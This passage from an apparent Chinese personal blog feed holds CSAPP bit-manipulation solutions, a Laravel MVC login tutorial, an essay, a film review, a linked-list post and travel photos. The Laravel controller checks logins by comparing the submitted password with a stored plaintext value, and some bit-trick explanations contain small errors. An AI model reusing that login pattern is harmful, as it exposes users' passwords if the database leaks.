((x&gt;&gt;8)&amp;mask);</span><br><span class="line"></span><br><span class="line">    mask &#x3D; 0xff + (0xff&lt;&lt;8);</span><br><span class="line">    x &#x3D; (x&amp;mask) + ((x&gt;&gt;16)&amp;mask);</span><br><span class="line"></span><br><span class="line">    return x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>问题要求返回参数x的位为1的个数。</p>
<p>所以我们需要一个个检查参数的每一位是否为1，并且将之累加起来。</p>
<p>从两位比特位入手，计算两位比特数中1的个数，就是高位与低位之和。</p>
<p>00: 0+0=(00)<sub>2</sub></p>
<p>01: 0+1=(01)<sub>2</sub></p>
<p>10: 1+0=(01)<sub>2</sub></p>
<p>11: 1+1=(10)<sub>2</sub></p>
<p>令一个二进制数B为b<sub>32</sub>b<sub>31</sub>…b<sub>1</sub></p>
<p>则L(l,r)表示一个二进制数在l和r区间之间的1的个数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">L(l,r)&#x3D; L(l,x)+ L(x+1,r) (l&lt;&#x3D;x&lt;r)</span><br><span class="line">L(l,r)&#x3D; bl (l&#x3D;r)</span><br></pre></td></tr></table></figure>
<p>对于一个32位的整数来说，可以用动态规划的思想自底向上计算。先计算L(1,1)+L(2,2)。</p>
<p>先构造一个只有低位L(1,1)的数<code>a=x&amp;x=0x01</code>和高位L(2,2)的数<code>b=(x&gt;&gt;1)&amp;0x01</code>,但我们发现可以同时计算L(3,3)和L(4,4)等数。只需将构造改为：</p>
<p><code>a=x&amp;0x55555555</code>,<code>b=(x&gt;&gt;1)&amp;0x55555555</code>, <code>x=a+b</code></p>
<p>计算L(1,2)和L(3,4)以此类推：</p>
<p><code>a=x&amp;0x33333333</code>, <code>b=(x&gt;&gt;1)&amp;0x33333333</code>, `x=a+b</p>
<h5 id="7-int-conditionalint-x-int-y-int-z"><a class="markdownIt-Anchor" href="#7-int-conditionalint-x-int-y-int-z"></a> 7. <code>int conditional(int x, int y, int z)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int conditional(int x, int y, int z) &#123;</span><br><span class="line">  x &#x3D; (!!x)&lt;&lt;31&gt;&gt;31;</span><br><span class="line">  return (y&amp;x)|(z&amp;~x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>题目要求该函数实现三元运算符，若x为真，则返回y,否则返回z。</p>
<p>若<code>x</code>的取值为<code>0x00000000</code>或<code>0xFFFFFFFF</code>。则答案为<code>(x&amp;y)|(~x&amp;z)</code>。</p>
<p>若<code>x！=0</code>时，将<code>x=0xFFFFFFFF</code>。<code>x = (!!x)&lt;&lt;31&gt;&gt;31</code>。</p>
<h5 id="8-int-isnonnegativeint-x"><a class="markdownIt-Anchor" href="#8-int-isnonnegativeint-x"></a> 8. <code>int isNonNegative(int x)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int isNonNegative(int x) &#123;</span><br><span class="line">    return !(x&gt;&gt;31);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>判断最高位。</p>
<h5 id="9int-isgreaterint-x-int-y"><a class="markdownIt-Anchor" href="#9int-isgreaterint-x-int-y"></a> 9.<code>int isGreater(int x, int y)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int isGreater(int x, int y) &#123;</span><br><span class="line">    int sign_x&#x3D;x&gt;&gt;31;</span><br><span class="line">    int sign_y&#x3D;y&gt;&gt;31;</span><br><span class="line">    int equal&#x3D;!(sign_x^sign_y)&amp;((~y+x)&gt;&gt;31);</span><br><span class="line">    int notequal&#x3D;sign_x&amp;!sign_y;</span><br><span class="line">    return !(equal|notequal);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>题目要求如果x&gt;y返回1否则返回0。</p>
<p>以下情况会返回<code>1</code>：</p>
<p>当<code>x&gt;0,y&lt;0</code>，或者当<code>x</code>和<code>y</code>符号相同时<code>mark_ = ~((x^y)&gt;&gt;31)</code>，满足<code>x+~y+1&gt;0</code>，<code>x!=y</code>时，<code>equl_ = !!(x^y)=1</code>，<code>x+~y+1&gt;=0</code>时，<code>(~(x+~y+1))&gt;&gt;31 = 0xffffffff</code></p>
<h5 id="10int-absvalint-x"><a class="markdownIt-Anchor" href="#10int-absvalint-x"></a> 10.<code>int absVal(int x)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int absVal(int x) &#123;</span><br><span class="line">  int sign&#x3D;x&gt;&gt;31;</span><br><span class="line">  return (x^sign)+(sign&amp;1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>返回x的绝对值。</p>
<p>首先判断x的符号位，即右移31位。</p>
<p>倘若为正数，则返回值不变；则先用x与sign异或再加上sign与1与运算。</p>
<p>倘若为负数则异或后（即按位取反减1）后要再加上。</p>
<h5 id="11-int-ispower2int-x"><a class="markdownIt-Anchor" href="#11-int-ispower2int-x"></a> 11. <code>int isPower2(int x)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int isPower2(int x) &#123;</span><br><span class="line">    int sign1&#x3D;!(x&gt;&gt;31);</span><br><span class="line">    int sign2&#x3D;!!x;</span><br><span class="line">    int sign3&#x3D;!(x&amp;(x+~0));</span><br><span class="line">    return (sign1&amp;sign2&amp;sign3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>题目要求如果参数x是2的权重返回1，否则返回0（负数都返回0）。</p>
<p>首先<code>sign1</code>判断x是正数还是负数，<code>sign2</code>判断x是否为0。若x为2的倍数，则x的位中则只有一位为1，因此当x为2的倍数时x和（x-1）按位与的结果必然为0，否则为1，因此将<code>!(x&amp;(x+~0))</code>作为<code>sign3</code>最后取与运算则得到结果。</p>
<h5 id="12unsigned-float_negunsigned-uf"><a class="markdownIt-Anchor" href="#12unsigned-float_negunsigned-uf"></a> 12.<code>unsigned float_neg(unsigned uf)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned float_neg(unsigned uf) &#123;</span><br><span class="line">    if((uf&amp;0x7fffffff)&gt;0x7f800000)return uf;</span><br><span class="line">    return uf^0x80000000;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>直接使用<code>&gt;</code>判断即可，但需要注意<code>+0/-0</code>还有<code>NaN</code>这两种特殊情况。</p>
<p>判断<code>NaN</code>时，指数段为<code>0xff</code>，小数段不全为<code>0</code>，<code>(uf&amp;0x7fffffff) &gt; 0x7f800000</code>。</p>
<h5 id="13unsigned-float_i2fint-x"><a class="markdownIt-Anchor" href="#13unsigned-float_i2fint-x"></a> 13.<code>unsigned float_i2f(int x)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned float_i2f(int x) &#123;</span><br><span class="line">  int s_ &#x3D; x&amp;0x80000000;</span><br><span class="line">  int n_ &#x3D; 30;</span><br><span class="line">  if(!x) return 0;</span><br><span class="line">  if(x&#x3D;&#x3D;0x80000000) return 0xcf000000;</span><br><span class="line">  if(s_) x &#x3D; ~x+1;</span><br><span class="line">  while(!(x&amp;(1&lt;&lt;n_))) n_--;</span><br><span class="line">  if(n_&lt;&#x3D;23) x&lt;&lt;&#x3D;(23-n_);</span><br><span class="line">  else&#123;</span><br><span class="line">    x+&#x3D;(1&lt;&lt;(n_-24));</span><br><span class="line">    if(x&lt;&lt;(55-n_)) ;else x&amp;&#x3D;(0xffffffff&lt;&lt;(n_-22));</span><br><span class="line">    if(x&amp;(1&lt;&lt;n_))  ;else n_++;</span><br><span class="line">    x &gt;&gt;&#x3D; (n_-23);</span><br><span class="line">  &#125;</span><br><span class="line">  x&#x3D;x&amp;0x007fffff;</span><br><span class="line">  n_&#x3D;(n_+127)&lt;&lt;23;</span><br><span class="line">  return x|n_|s_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>分三部分处理，获取符号位<code>s_ = x&amp;0x80000000</code>，若为负数<code>-x</code>，变为正数，则<code>0x80000000</code>为特殊情况分开处理，考虑特殊情况，<code>0x0</code>和<code>0x80000000</code>，这两种情况直接返回<code>0</code>和<code>0xcf000000</code>。</p>
<p>获取最高位的<code>1</code>所在位置，<code>while(!(x&amp;(1&lt;&lt;n_))) n_--;</code>。</p>
<p>若<code>n_ &lt;= 23</code>这个数需要向左移动到小数部分起始位置（将<code>1</code>放在第<code>23</code>位上），<code>if(n_&lt;=23) x&lt;&lt;=(23-n_);</code>。</p>
<p>若<code>n_ &gt; 23</code>这个数需要向右移动到小数部分起始位置（将<code>1</code>放在第<code>23</code>位上），这时候需要考虑移出部分的舍入问题，若移出部分大于<code>0.5</code>则向上舍入，若小于<code>0.5</code>则向下舍去，若等于<code>0.5</code>则向偶数舍入。</p>
<p>先将<code>&gt;=0.5</code>情况等同考虑，向上舍入<code>x+=(1&lt;&lt;(n_-24))</code>。若<code>==0.5</code>时，舍入情况若为奇数，我们需要<code>-1</code>操作变为偶数，即将最低位的<code>1</code>变为<code>0</code>，<code>x&amp;=(0xffffffff&lt;&lt;(n_-22))</code>，若向上舍入时最高位产生了进位，还需要加上进位<code>if(x&amp;(1&lt;&lt;n_)) ;else n_++;</code>。之后拼接浮点数即可。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>从Laravel框架浅谈MVC架构</title>
    <url>/2020/03/07/talk-MVC/</url>
    <content><![CDATA[<p>最近应工作室要求学习PHP框架Laravel，接触到了MVC软件架构模式,即Model-View-Controller，这里我将使用Laravel框架介绍MVC架构模式，并且阐述自己对MVC软件架构浅薄的理解。</p>
<p><img src="/2020/03/07/talk-MVC/MVC.jpg" alt></p>
<a id="more"></a>
<h2 id="mvc架构简述"><a class="markdownIt-Anchor" href="#mvc架构简述"></a> MVC架构简述：</h2>
<h4 id="由图所示简单地理解mvc架构模式可以认为"><a class="markdownIt-Anchor" href="#由图所示简单地理解mvc架构模式可以认为"></a> 由图所示，简单地理解MVC架构模式可以认为：</h4>
<p>1.View（视图）：是用户直接接触的界面，一般由前端处理，主要用来展示模型中的内容和用来输入表单数据。</p>
<p>2.Controller（控制器）：主要用于处理视图和模型之间的逻辑关系，例如从视图中post的数据，到底如何进入模型并存入数据库中，我们是否应该对于用户的数据进行过滤以防止SQL注入等问题，又或者从数据库中取出的数据哪些应该展示在视图上，有什么判断标准，都需要控制器进行判断。</p>
<p>3.Model（模型）：即底层同应用程序的接口，我们可以从Model中获取数据并进行处理。</p>
<p>以上是我对于MVC的一些理解，因为刚刚接触这种软件架构模式，所以理解不深，如果有兴趣者可以自行去深入了解。</p>
<h4 id="以下给出mvc的一些友情链接"><a class="markdownIt-Anchor" href="#以下给出mvc的一些友情链接"></a> 以下给出MVC的一些友情链接：</h4>
<p><a href="%22%5Bhttps://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller%5D">维基百科</a></p>
<p><a href="%22https://draveness.me/mvx%22">浅谈MVC、MVP和MVVM架构模式</a></p>
<h2 id="laravel实例"><a class="markdownIt-Anchor" href="#laravel实例"></a> Laravel实例：</h2>
<h4 id="接下来我将使用laravel对于这一架构模式进行说明laravel只是媒介这里不涉及laravel语法细节"><a class="markdownIt-Anchor" href="#接下来我将使用laravel对于这一架构模式进行说明laravel只是媒介这里不涉及laravel语法细节"></a> 接下来我将使用Laravel对于这一架构模式进行说明（Laravel只是媒介，这里不涉及Laravel语法细节）：</h4>
<p>假如说我们需要写一个登录界面那么我们使用MVC如何处理呢？</p>
<p>首先，我们需要一个登陆界面，这个登录界面是需要让用户看到的，并且在这个界面中，我们还需要让用户在登录界面中输入数据并且可以让控制器接收到，因此我们可以写html，php或者Laravel支持的blade模板，总之，不管使用哪种形式，最重要的是让用户有可视化界面并且实现登陆功能。</p>
<p>我用blade模板进行举例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@extends(&quot;common.layout&quot;)</span><br><span class="line">@section(&quot;title&quot;)</span><br><span class="line">    Login</span><br><span class="line">@stop</span><br><span class="line"></span><br><span class="line">@section(&quot;content&quot;)</span><br><span class="line"></span><br><span class="line">    &lt;div class&#x3D;&quot;xiao-container&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;xiao-register-box&quot;&gt;</span><br><span class="line">            &lt;div class&#x3D;&quot;xiao-title-box&quot;&gt;</span><br><span class="line">                &lt;span&gt;登录&lt;&#x2F;span&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">            &lt;form action&#x3D;&quot;&#123;&#123;url(&#39;at&#x2F;save&#39;)&#125;&#125;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">                &#123;&#123;csrf_field()&#125;&#125;</span><br><span class="line">                &lt;div class&#x3D;&quot;xiao-username-box&quot;&gt;</span><br><span class="line">                    &lt;span class&#x3D;&quot;xiao-require&quot;&gt;*&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;label for&#x3D;&quot;account&quot;&gt;账户&lt;&#x2F;label&gt;</span><br><span class="line">                    &lt;div class&#x3D;&quot;xiao-username-input&quot;&gt;</span><br><span class="line">                        &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;account&quot; name&#x3D;&quot;account&quot; placeholder&#x3D;&quot;账户：&quot;&#x2F;&gt;</span><br><span class="line">                    &lt;&#x2F;div&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">                &lt;br&#x2F;&gt;&lt;br&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">                &lt;div class&#x3D;&quot;xiao-userPassword-box&quot;&gt;</span><br><span class="line">                    &lt;span class&#x3D;&quot;xiao-require&quot;&gt;*&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;label for&#x3D;&quot;password&quot;&gt;密码&lt;&#x2F;label&gt;</span><br><span class="line">                    &lt;div class&#x3D;&quot;xiao-userPassword-input&quot;&gt;</span><br><span class="line">                        &lt;input type&#x3D;&quot;password&quot; id&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; placeholder&#x3D;&quot;密码：&quot; &#x2F;&gt;</span><br><span class="line">                    &lt;&#x2F;div&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;xiao-submit-box&quot;&gt;</span><br><span class="line">                    &lt;input id &#x3D; &quot;xiao-submit-button&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;登录&quot;&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">            &lt;&#x2F;form&gt;</span><br><span class="line">            @if ($errors-&gt;any())</span><br><span class="line">                &lt;div class&#x3D;&quot;alert alert-danger&quot;&gt;</span><br><span class="line">                    &lt;ul&gt;</span><br><span class="line">                        @foreach ($errors-&gt;all() as $error)</span><br><span class="line">                            &lt;li&gt;&#123;&#123; $error &#125;&#125;&lt;&#x2F;li&gt;</span><br><span class="line">                        @endforeach</span><br><span class="line">                    &lt;&#x2F;ul&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">            @endif</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">@stop</span><br></pre></td></tr></table></figure>
<p>我们无需管语法细节，只需要注意，我们在这里设计了一个表单，并且将方法设置为post，因此可以使控制器接收到数据，那么相应地，我们也需要设置相应的路由与控制器方法（路由是用户访问url所必需的）</p>
<h4 id="路由"><a class="markdownIt-Anchor" href="#路由"></a> 路由：</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Route::any(<span class="string">&#x27;at/login&#x27;</span>,[<span class="string">&#x27;uses&#x27;</span> =&gt; <span class="string">&#x27;StudentController@login&#x27;</span>]);</span><br><span class="line">Route::any(<span class="string">&#x27;at/save&#x27;</span>,[<span class="string">&quot;uses&quot;</span> =&gt; <span class="string">&quot;StudentController@save&quot;</span>]);</span><br></pre></td></tr></table></figure>
<h4 id="控制器"><a class="markdownIt-Anchor" href="#控制器"></a> 控制器：</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StudentController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> view(<span class="string">&#x27;student.login&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params">Request $request</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $validate= $request-&gt;validate(</span><br><span class="line">            [</span><br><span class="line">                <span class="string">&quot;account&quot;</span> =&gt; <span class="string">&quot;required|string|max:20&quot;</span>,</span><br><span class="line">                <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;required|string|max:20&quot;</span></span><br><span class="line">            ]</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span>($validate)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;judge($request-&gt;input(<span class="string">&quot;account&quot;</span>),$request-&gt;input(<span class="string">&quot;password&quot;</span>)))</span><br><span class="line">            &#123;<span class="keyword">return</span> <span class="literal">true</span>;&#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;账号不存在或密码不正确&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">judge</span>(<span class="params">$account,$password</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;<span class="keyword">return</span> Student::where(<span class="string">&quot;account&quot;</span>,$account)-&gt;value(<span class="string">&#x27;password&#x27;</span>)==$password;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样我们就可以了解到从登录界面post的数据，被控制器中的save的$request变量捕获了，并且将其进行了表单验证，我们需要进行两次验证，第一次验证用户输入是否合法，如果不合法，该方法将会重定向到登录页面要求你重新输入，否则的话，进行第二次验证，从Model里（我们在Model封装了数据库，这里不再展示）取出数据进行比对，如果账号密码都符合条件，就成功验证，否则会告诉你账号或密码输入不正确。</p>
<p>现在，我们就完成了最简单的MVC与User之间的交互模式。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>后端开发</tag>
        <tag>Laravel</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>我不适合写作文</title>
    <url>/2020/03/05/no-suit-writting/</url>
    <content><![CDATA[<p>从小学到高中，我的作文成绩从来没有高过，因为当我拿到特定的作文题目时，并且被要求在特定规限的时间写完，我总是感到头脑一片空白和不知所措，只能依靠一些特定的写法和烂俗的套路完成；或许有时候我遇到一些灵光乍现的想法，但这些想法也通常不被认可。</p>
<a id="more"></a>
<p>但是，当我看完其他人的”优秀作文“以后，我却觉得他们写的一点也不比我好，同样是特定的写法和烂俗的套路，唯一比我具有优势的是他们的字写的比我好。而且我发现，他们仿佛除了作文以外，是不大会写其他东西的，这使我想到，“写作文”和“写文章”根本不是一码事，作文写得好无非是套路掌握得好或者更加迎合试卷命题与阅卷老师的心理罢了。而文章，则是天马行空，无所不至，你想写就写，不想写就不写，不必受到题目的限制，只需要有感情的召唤就足够了。</p>
<p>我觉得写文章是自己的事，是不能被其他人的其他标准所评判的。</p>
]]></content>
      <categories>
        <category>杂文</category>
      </categories>
      <tags>
        <tag>吐槽</tag>
      </tags>
  </entry>
  <entry>
    <title>See You Never</title>
    <url>/2020/03/04/see-you-never/</url>
    <content><![CDATA[<p>刚刚看完了《后会无期》，觉得还是一个不错的片子，虽然被很多人诟病为没有主线剧情，结构松散。但是，我想表达的是，不是所有的影片都需要完整的主线剧情，只要影片所表达的东西，可以告诉观众一些东西，或者震撼观众的心灵，就是好的影片。</p>
<p>这部影片虽然没有主要的剧情，但一对对的分支的剧情，也确实围绕着“后会无期”的主题展开，从头到尾主人公一行遇到的人或事，在最终都是“后会无期”，注意，这里的后会无期并非是以后再也不会见到了，而是“有可能遇到，也有可能遇不到了”，也就是处于一种“未卜”的状态，其中使我震撼的一段是马浩汉将被雨淋湿的钱和江河把苏米的“包小姐”联系牌放在车窗上晒，然后等一觉醒来以后，却发现连车窗都没了，这段确实十分的荒诞，但倘若联系到实际的话，不得不承认它具备一定的合理性，连死物件都可能后会无期，何况人呢？</p>
<a id="more"></a>
<p><img src="/2020/03/04/see-you-never/1.jpg" alt></p>
<p>从马浩汉用火烧了房子却忘了把煤气罐搬出房子开始，就注定这是一场有去无回的旅行，虽然马浩汉开始的表现十分的一往无前和具有极大的勇气，但随着时间的消磨，而实际上最具有勇气的是江河这个未经社会打磨，具备理想主义和有些神经质的地理教师。虽然马浩汉鼓吹自己“行路多，社会阅历广，朋友多”，但不得不承认像江河这种习惯孤独的人才不容易被恶劣的环境打败。</p>
<p>最后说一说关于苏米同江河之间有些“朦胧”的感情，虽然苏米直言“自己很厌恶男人”，并且在首先同江河交流的时候，时不时露出揶揄的表情，但是苏米在听到江河“无脑”的同声传译却在不经意间攻破了苏米的防线。儿时对未来的幻想，有哪个是没有的呢？又有多少人，能够在自己长大的时候，回望当初的期许，而不生出一点遗憾的呢？“我会变漂亮吗？”好像是。“我会变富有吗？”好像不是。“世事难料”的确如此。“顺其自然。”我还可以做到吗？于是苏米望过来的眼神就开始变化了。注意到苏米两次让江河“说点什么以缓解尴尬”，第一次说的时候，她面无表情；但是在第二次说的时候，她面带微笑，无比轻松惬意。</p>
<p>最后来到了三叔一行赶到了主角一行所在的加油站，当苏米看到三叔一行来到的时候，她感到“惊讶与错愕”，连刚买的东西都掉落了。当她同她失语的哥哥用手语交流，并“直言不讳”地说出“我好像喜欢上他了”，她本期盼得到哥哥诸如鼓励的话，但得到的确是“你忘了那个王八蛋了吗？”。</p>
<p>江河一只看起来呆头呆脑，在感情中处于被动状态，但从他那孱弱的身躯但却一脚踹开旅馆那个岌岌可危的大门的时候，就已经证明这个男人实在蕴含着无尽的能量，他对于苏米表达喜欢的方式就是不断劝她从良，具体来说，我感觉这就像是现实生活中我们某些直男的做法（逃。</p>
<p>而实际上，苏米也并无像她表现的那样对于社会的美好一切看破，也就如同马浩汉看起来那么乐观一样，而真正所谓“看破尘世美好的”，大概是像她三叔那样，虽然嘴里说着“只有家人替你好”，可实际上却又逼着你犯罪。最终，苏米被带走，后会无期。</p>
<p>最终结尾是苏米靠在了江河的肩上，虽然我不知道这是不是幻想，但我相信它是现实。</p>
<p>最后的最后，我希望同有的人永远后会无期，有的人…我期盼再次相遇。</p>
<hr>
<p>最近看了几篇影评，想再来补充几句，有的人说其实马浩汉从刘莺莺那里出发之后就遭遇车祸死去了，后来的全是江河在自己的小说《旅行者》的臆想，从那个神秘人物阿吕开始就是江河小说中的想象了，直至最会江河和浩汉的分别更是暗示了浩汉的死亡。而且电影开始也以胡生的口吻暗示了这是江河的小说《旅行者》的故事。而后江河与浩汉的故事则是江河本人的分裂了，至于最后看起来美好的结局也有着诡异之处，比如在东极岛上暴雨下柴伯公巨像的火炬仍然燃烧，还有幽灵导游的声音。这是浪漫主义的处理手法，我相信是如此的。现实太残酷了，总是要有浪漫的。</p>
<p><img src="/2020/03/04/see-you-never/2.jpg" alt></p>
]]></content>
      <categories>
        <category>电影</category>
      </categories>
      <tags>
        <tag>文学</tag>
        <tag>人生</tag>
      </tags>
  </entry>
  <entry>
    <title>Reserve Linked List</title>
    <url>/2020/03/02/%E9%93%BE%E8%A1%A8%E5%8F%8D%E8%BD%AC/</url>
    <content><![CDATA[<p>Last week I learned data structure about Linked List , in which include an algorithm for reversing a linked list . And in this chapter I will introduce this algorithm.</p>
<a id="more"></a>
<p>First considering a simple example . You is given a linked list of integers , and the question asks you to invert this linked list.</p>
<p>For example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL</span><br><span class="line"></span><br><span class="line">5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;NULL</span><br></pre></td></tr></table></figure>
<p>For iterating through this linked list and inverting it , you can declare three pointers (prev , curr, next), which represent the previous , current , next pointers. And in this way can you search this linked list and invert it iteratively.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"> <span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">​    ListNode* prev=<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">​    ListNode* curr=head;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">while</span>(curr!=<span class="literal">NULL</span>)</span><br><span class="line"></span><br><span class="line">​    &#123;</span><br><span class="line"></span><br><span class="line">​      ListNode* next=curr-&gt;next;</span><br><span class="line"></span><br><span class="line">​      curr-&gt;next=prev;</span><br><span class="line"></span><br><span class="line">​      prev=curr;</span><br><span class="line"></span><br><span class="line">​      curr=next;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">return</span> prev;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
        <tag>Leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>关于意大利</title>
    <url>/2020/02/29/Italy-memory/</url>
    <content><![CDATA[<h3 id="蛋堡"><a class="markdownIt-Anchor" href="#蛋堡"></a> 蛋堡</h3>
<p><img src="/2020/02/29/Italy-memory/Italy1.jpg" alt="蛋堡" title="蛋堡"></p>
<h3 id="那不勒斯"><a class="markdownIt-Anchor" href="#那不勒斯"></a> 那不勒斯</h3>
<p><img src="/2020/02/29/Italy-memory/Italy2.jpg" alt="那不勒斯" title="那不勒斯"></p>
<h3 id="卡布里岛"><a class="markdownIt-Anchor" href="#卡布里岛"></a> 卡布里岛</h3>
<p><img src="/2020/02/29/Italy-memory/Italy3.jpg" alt="卡布里岛" title="卡布里岛"><a id="more"></a></p>
<h3 id="卡布里岛上的购物街"><a class="markdownIt-Anchor" href="#卡布里岛上的购物街"></a> 卡布里岛上的购物街</h3>
<p><img src="/2020/02/29/Italy-memory/Italy4.jpg" alt="卡布里岛上的购物街" title="卡布里岛上的购物街"></p>
<h3 id="傍晚的苏莲托"><a class="markdownIt-Anchor" href="#傍晚的苏莲托"></a> 傍晚的苏莲托</h3>
<p><img src="/2020/02/29/Italy-memory/Italy5.jpg" alt="傍晚的苏莲托" title="傍晚的苏莲托"></p>
<h3 id="酒店在举办音乐会"><a class="markdownIt-Anchor" href="#酒店在举办音乐会"></a> 酒店在举办音乐会</h3>
<h3 id="酒店在举办音乐会-2"><a class="markdownIt-Anchor" href="#酒店在举办音乐会-2"></a> <img src="/2020/02/29/Italy-memory/Italy6.jpg" alt="酒店在举办音乐会" title="酒店在举办音乐会"></h3>
<h3 id="凯旋门"><a class="markdownIt-Anchor" href="#凯旋门"></a> 凯旋门</h3>
<p><img src="/2020/02/29/Italy-memory/Italy7.jpg" alt="凯旋门" title="凯旋门"></p>
<h3 id="罗马斗兽场外部"><a class="markdownIt-Anchor" href="#罗马斗兽场外部"></a> 罗马斗兽场外部</h3>
<p><img src="/2020/02/29/Italy-memory/Italy8.jpg" alt="罗马斗兽场外部" title="罗马斗兽场外部"></p>
<h3 id="罗马斗兽场内部"><a class="markdownIt-Anchor" href="#罗马斗兽场内部"></a> 罗马斗兽场内部</h3>
<p><img src="/2020/02/29/Italy-memory/Italy9.jpg" alt="罗马斗兽场内部" title="罗马斗兽场内部"></p>
<h3 id="凯旋门正面"><a class="markdownIt-Anchor" href="#凯旋门正面"></a> 凯旋门正面</h3>
<p><img src="/2020/02/29/Italy-memory/Italy10.jpg" alt="凯旋门" title="凯旋门"></p>
<h3 id="西班牙广场"><a class="markdownIt-Anchor" href="#西班牙广场"></a> 西班牙广场</h3>
<p><img src="/2020/02/29/Italy-memory/Italy11.jpg" alt="西班牙广场" title="西班牙广场"></p>
<h3 id><a class="markdownIt-Anchor" href="#"></a> </h3>
<p><img src="/2020/02/29/Italy-memory/Italy12.jpg" alt="西班牙广场" title="西班牙广场"></p>
<p><img src="/2020/02/29/Italy-memory/Italy13.jpg" alt="西班牙广场" title="西班牙广场"></p>
<h3 id="梵蒂冈"><a class="markdownIt-Anchor" href="#梵蒂冈"></a> 梵蒂冈</h3>
<p><img src="/2020/02/29/Italy-memory/Italy14.jpg" alt="梵蒂冈" title="梵蒂冈"></p>
<h3 id="瑞士雇佣兵"><a class="markdownIt-Anchor" href="#瑞士雇佣兵"></a> 瑞士雇佣兵</h3>
<p><img src="/2020/02/29/Italy-memory/Italy15.jpg" alt="瑞士雇佣兵" title="瑞士雇佣兵"></p>
<p><img src="/2020/02/29/Italy-memory/Italy16.jpg" alt></p>
<p><img src="/2020/02/29/Italy-memory/Italy17.jpg" alt></p>
